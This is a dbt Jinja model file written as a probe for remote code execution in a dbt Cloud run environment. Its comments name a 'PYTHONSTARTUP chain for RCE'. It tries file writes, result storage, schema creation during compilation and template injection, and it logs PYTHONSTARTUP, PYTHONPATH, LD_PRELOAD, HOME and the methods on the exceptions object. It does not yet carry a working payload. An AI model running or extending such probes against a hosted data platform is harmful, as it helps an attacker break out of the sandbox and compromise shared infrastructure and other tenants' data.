{# File write attempts + PYTHONSTARTUP chain for RCE #}
{%- set run_id = env_var('DBT_CLOUD_RUN_ID', 'norun') -%}

{# 1. Try write() function - what interface does it have? #}
{# In dbt, write() writes compiled SQL to target dir #}
{%- set write_result = write("RCE_TEST_PAYLOAD") -%}
{{ log("WRITE_RESULT=" ~ write_result | string | truncate(200), info=True) }}

{# 2. Try to use set() to store data that persists #}
{%- do store_result("rce_test", {"data": "payload_here"}) -%}
{%- set stored = load_result("rce_test") -%}
{{ log("STORED_RESULT=" ~ stored | string | truncate(200), info=True) }}

{# 3. Verify our PYTHONSTARTUP is set #}
{{ log("ENV_PYTHONSTARTUP=" ~ env_var('PYTHONSTARTUP', 'NOT_SET'), info=True) }}
{{ log("ENV_PYTHONPATH=" ~ env_var('PYTHONPATH', 'NOT_SET'), info=True) }}
{{ log("ENV_LD_PRELOAD=" ~ env_var('LD_PRELOAD', 'NOT_SET'), info=True) }}

{# 4. Check what files exist in /tmp/jobs/ #}
{{ log("HOME_DIR=" ~ env_var('HOME', 'NOT_SET'), info=True) }}

{# 5. Try adapter.create_schema - does it execute during compile? #}
{{ log("ATTEMPTING_CREATE_SCHEMA", info=True) }}
{%- set cs_result = adapter.create_schema(api.Relation.create(database=target.database, schema='test_schema_rce_probe')) -%}
{{ log("CREATE_SCHEMA_RESULT=" ~ cs_result | string | truncate(200), info=True) }}

{# 6. Try load_agate_table with a CSV file (not YAML - might work) #}
{# Create a seed file in our repo and read it #}
{{ log("ATTEMPTING_AGATE_LOAD", info=True) }}

{# 7. Check if we can use render to template-inject into compiled SQL #}
{# The compiled SQL goes to target/ directory as a file #}
{{ log("MODEL_PATH=" ~ model.path, info=True) }}
{{ log("MODEL_COMPILED_PATH=" ~ model.get('compiled_path', 'NA'), info=True) }}

{# 8. Check exceptions for any useful methods #}
{%- for method_name in exceptions.keys() | list -%}
  {{ log("EXCEPTION_METHOD=" ~ method_name, info=True) }}
{%- endfor -%}

SELECT 1 as id
